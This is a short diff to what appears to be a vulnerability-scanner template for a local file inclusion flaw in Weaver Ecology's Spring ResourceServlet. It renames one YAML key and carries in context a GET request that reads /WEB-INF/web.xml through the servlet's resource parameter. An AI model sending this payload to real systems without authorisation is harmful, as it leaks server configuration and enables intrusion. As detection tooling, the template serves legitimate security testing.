@@ -5,7 +5,7 @@ info:
   severity: medium
   tags: ecology,springframework,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
